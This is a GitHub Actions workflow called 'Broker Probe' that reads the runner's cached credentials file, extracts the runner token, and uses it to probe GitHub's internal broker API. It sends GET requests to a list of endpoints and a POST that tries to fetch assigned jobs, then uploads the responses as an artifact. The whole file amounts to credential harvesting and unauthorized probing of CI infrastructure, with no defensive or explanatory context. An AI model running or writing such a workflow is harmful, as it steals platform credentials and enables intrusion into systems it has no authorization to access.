name: Broker Probe
on:
  workflow_dispatch:

jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Test broker API access
        run: |
          set +e
          exec 3>&1 1>/tmp/broker_output.txt 2>&1
          BROKER_URL="https://broker.actions.githubusercontent.com"
          TOKEN=$(cat /home/runner/actions-runner/cached/2.335.1/.credentials | python3 -c "import sys,json; print(json.load(sys.stdin)['Data']['token'])")
          echo "=== Broker API test ==="
          # Try various endpoints
          for endpoint in "/" "/api/v1" "/jobs" "/health" "/status" "/version" "/messages" "/runner/status"; do
            echo "--- GET $BROKER_URL$endpoint ---"
            code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 "$BROKER_URL$endpoint" \
              -H "Authorization: Bearer $TOKEN" 2>&1)
            echo "HTTP $code"
          done
          echo "=== Broker POST test ==="
          # Try to get assigned jobs
          RESULT=$(curl -sv --connect-timeout 5 "$BROKER_URL/api/v1/jobs" \
            -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/json" \
            -d '{}' 2>&1)
          echo "$RESULT" | head -20

      - uses: actions/upload-artifact@v4
        with:
          name: broker-results
          path: /tmp/broker_output.txt
